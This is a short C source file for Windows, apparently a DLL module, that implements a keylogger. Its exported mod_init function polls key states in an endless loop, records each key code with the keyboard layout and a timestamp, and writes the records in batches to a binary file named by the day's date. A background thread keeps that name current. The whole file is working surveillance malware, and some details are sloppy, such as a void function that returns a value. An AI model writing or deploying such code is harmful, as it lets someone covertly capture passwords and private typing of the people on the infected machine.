#include <stdio.h>
#include <windows.h>
#include <time.h>

#define BUFFSIZE 200
#define LOGNAMELENGTH 20
char log_name[20];

typedef struct {
	int code;
	HKL locale;
	time_t timestamp;
} KeyPress;

int Save(KeyPress keypress[BUFFSIZE])
{
	FILE *fptr;
	fptr = fopen(log_name, "wb");
	int i;
	for (i = 0; i < BUFFSIZE; i++)
	{
		fwrite(&keypress[i].code, sizeof(int), 1, fptr);
		fwrite(&keypress[i].locale, sizeof(HKL), 1, fptr);
		fwrite(&keypress[i].timestamp, sizeof(time_t), 1, fptr);
	}
	
	fclose(fptr);

	return 0;
}

void check_date()
{
	time_t t = time(NULL);
	struct tm tm = *localtime(&t);
	char date[LOGNAMELENGTH];

	snprintf(date, sizeof(log_name), "%d-%d-%d.bin", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday);

	if (strcmp(log_name, date) != 0)
		strcpy(log_name, date);
}

DWORD WINAPI ThreadFunc(void* data) {

	while (1)
	{
		check_date();
	}
	return 0;
}

__declspec(dllexport) void mod_init()
{
	int i;
	int buffer_size = 0;
	KeyPress keypress[BUFFSIZE];
	HANDLE thread = CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL);

	while (1)
	{
		for (i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) & 0x0001)
			{
				if (buffer_size == BUFFSIZE)
				{
					Save(keypress);
					buffer_size = 0;
					fflush(stdin);
				}

				keypress[buffer_size].code = i;
				keypress[buffer_size].locale = GetKeyboardLayout(0);
				keypress[buffer_size].timestamp = time(NULL);
				
				printf("%d ", keypress[buffer_size].code);
				buffer_size++;
			}
		}
	}
	return 0;
}